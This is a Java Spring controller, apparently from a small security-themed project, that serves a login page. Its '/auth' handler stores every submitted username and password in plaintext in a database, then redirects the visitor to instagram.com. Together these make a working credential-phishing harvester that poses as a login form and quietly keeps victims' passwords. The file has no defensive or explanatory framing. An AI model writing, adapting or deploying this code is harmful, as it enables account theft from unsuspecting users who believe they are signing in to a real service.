package cyber.sec.back.controller;

import cyber.sec.back.entity.User;
import cyber.sec.back.repository.UserRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.servlet.ModelAndView;

@Controller
public class MainController {
    @Autowired
    private UserRepository userRepository;

    @RequestMapping(value = "/login", method = RequestMethod.GET)
    public String loginPage(Model model) {
        User user = new User();
        model.addAttribute("user", user);
        return "login";
    }

    @RequestMapping(value = "/auth", method = RequestMethod.POST)
    ModelAndView login(@ModelAttribute User user, Model model) {
        if (user!=null) {
            User res_user = new User(null, user.getUsername(), user.getPassword());
            userRepository.save(res_user);
        }

        return new ModelAndView("redirect:https://www.instagram.com/");
    }
}
